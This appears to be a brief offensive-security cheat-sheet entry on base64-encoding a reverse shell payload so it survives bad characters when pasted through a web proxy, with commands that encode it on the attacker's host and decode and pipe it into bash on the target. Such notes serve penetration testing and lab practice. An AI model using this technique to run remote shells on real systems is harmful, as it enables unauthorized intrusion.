# Encoding reverse shell

Encoding a reverse shell in base64 can help with bad chars when pasting in a web proxy.

## Example
```bash
# on host

echo -n "$REV_SHELL" | base64

# on target

echo -n "$BASE64" | base64 -d | bash
```